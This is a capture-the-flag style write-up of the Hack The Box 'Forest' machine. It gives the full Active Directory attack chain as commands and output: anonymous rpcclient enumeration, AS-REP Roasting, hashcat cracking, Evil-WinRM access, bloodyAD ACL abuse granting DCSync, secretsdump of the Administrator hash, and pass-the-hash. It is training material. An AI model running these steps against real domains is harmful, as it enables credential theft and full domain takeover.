---
title: "Hack The Box - Forest - Writeup"
description: "Anonymous RPC enumeration, AS-REP Roasting, BloodHound privilege analysis, ACL abuse, and DCSync exploitation on HackTheBox Forest."

platform: "Hack The Box"
date: 2026-05-24
image: "/images/forest.png"
difficulty: "Easy"
draft: false

tags:
  - HackTheBox
  - Windows
  - Active Directory
  - AS-REP Roasting
  - BloodHound
  - DCSync
  - ACL Abuse
  - WinRM

categories:
  - HTB

ShowToc: true
TocOpen: true
ShowReadingTime: false
ShowBreadCrumbs: false
---

{{< section >}}

# Overview

Forest is a beginner-friendly Active Directory machine that focuses on domain enumeration, Kerberos abuse, BloodHound privilege analysis, and ACL exploitation.

The machine demonstrates how a low-privileged domain account can eventually lead to full Domain Administrator compromise through delegated Active Directory permissions.

{{< /section >}}

---

{{< section >}}

# Attack Path Summary

```text
Anonymous RPC Enumeration
            ↓
User Discovery
            ↓
AS-REP Roasting
            ↓
Hash Cracking
            ↓
WinRM Access
            ↓
BloodHound Analysis
            ↓
ACL Abuse
            ↓
DCSync
            ↓
Domain Administrator
```

{{< /section >}}

---

# Reconnaissance

## Nmap Scan

Initial service enumeration:

```bash
nmap -sVC -Pn 10.129.37.0
```

Results:

```text
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
5985/tcp open  http
```

The exposed services strongly suggested that the target was functioning as a Domain Controller.

**Important observations**:
{{< note >}}
- Kerberos exposed
- LDAP available
- SMB accessible
- WinRM enabled
{{</ note >}}

---

## Service Enumeration

{{< note >}}


Anonymous RPC enumeration was allowed on the target system.

Using `rpcclient`, domain users could be enumerated without authentication.

{{</ note >}}

---

## Vulnerability Identification

{{< note >}}

The environment exposed several common Active Directory attack surfaces:

- Anonymous RPC access
- Kerberos accounts vulnerable to AS-REP Roasting
- Excessive delegated ACL permissions
- WinRM access for remote management
{{</ note >}}

---

# Initial Foothold

## RPC Enumeration

Using `rpcclient`:

```bash
rpcclient -U "" -N 10.129.37.0
```

Enumerating users:

```bash
enumdomusers
```

Interesting accounts discovered:

```text
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

Among the enumerated users, `svc-alfresco` appeared to be a service account and became the primary target for further investigation.

---

## AS-REP Roasting

{{< note >}}

> AS-REP Roasting is a Kerberos attack technique that targets accounts with
> Kerberos pre-authentication disabled.
>
> Attackers can request encrypted authentication material directly from the
> Domain Controller without valid credentials and attempt offline password cracking.

{{< /note >}}

Using Impacket:

```bash
impacket-GetNPUsers htb.local/svc-alfresco -no-pass -dc-ip 10.129.37.0
```

Successful output:

```text
$krb5asrep$23$svc-alfresco@HTB.LOCAL:...
```

The account was confirmed to be vulnerable to AS-REP Roasting.

---

## Cracking the Hash

Using Hashcat:

```bash
hashcat -m 18200 svc-alfresco.hash /usr/share/wordlists/rockyou.txt
```

Recovered credentials:

```text
svc-alfresco:s3rvice
```

---

## WinRM Access

Using the recovered credentials, remote shell access was obtained through WinRM:

```bash
evil-winrm -u svc-alfresco -p 's3rvice' -i 10.129.37.0
```

Successful authentication granted PowerShell access to the target system.

---

# Privilege Escalation

## BloodHound Enumeration


![BloodHound Attack Path](/images/forest-bloodhound.png)

After obtaining an initial foothold, internal Active Directory enumeration was performed using SharpHound.

BloodHound analysis revealed the following privilege chain:

```text
Account Operators
        ↓ GenericAll
Exchange Windows Permissions
        ↓ WriteDacl
HTB.LOCAL Domain Object
```
{{< note >}}

The compromised `svc-alfresco` account was a member of `Account Operators`, which possessed `GenericAll` permissions over the `Exchange Windows Permissions` group.

The `Exchange Windows Permissions` group had `WriteDacl` rights over the domain object, making it possible to grant DCSync privileges to `svc-alfresco`.
{{</ note >}}
---

## ACL Abuse

Adding `svc-alfresco` to the `Exchange Windows Permissions` group:

```bash
bloodyAD --host 10.129.37.0 \
-d htb.local \
-u svc-alfresco \
-p 's3rvice' \
add groupMember "EXCHANGE WINDOWS PERMISSIONS" "svc-alfresco"
```

Granting DCSync privileges:

```bash
bloodyAD --host 10.129.37.0 \
-d htb.local \
-u svc-alfresco \
-p 's3rvice' \
add dcsync svc-alfresco
```

---

## DCSync Attack

Using Impacket:

```bash
impacket-secretsdump htb.local/svc-alfresco:'s3rvice'@10.129.37.0
```

Administrator NTLM hash:

```text
Administrator:32693b11e6aa90eb43d32c72a07ceea6
```

---

## Administrator Access

Using Pass-the-Hash authentication:

```bash
evil-winrm -i 10.129.37.0 \
-u Administrator \
-H 32693b11e6aa90eb43d32c72a07ceea6
```

Successful authentication resulted in Domain Administrator access.

---

{{< section >}}

# Skills & Concepts

* Active Directory Enumeration
* RPC Enumeration
* Kerberos Abuse
* AS-REP Roasting
* BloodHound Analysis
* ACL Abuse
* DCSync
* Pass-the-Hash
* Active Directory Privilege Escalation

{{< /section >}}

---

{{< section >}}

# Tools Used

* Nmap
* rpcclient
* Impacket
* Hashcat
* Evil-WinRM
* BloodHound
* SharpHound
* BloodyAD

{{< /section >}}

---

# Lessons Learned

Forest is an excellent introductory Active Directory machine because it demonstrates several core AD attack concepts in a realistic attack chain:

- Anonymous domain enumeration
- Kerberos abuse through AS-REP Roasting
- Internal privilege mapping with BloodHound
- ACL-based privilege escalation
- DCSync attacks
- Pass-the-Hash authentication

The machine also highlights the dangers of excessive delegated permissions and insecure Active Directory configurations inside enterprise environments.

---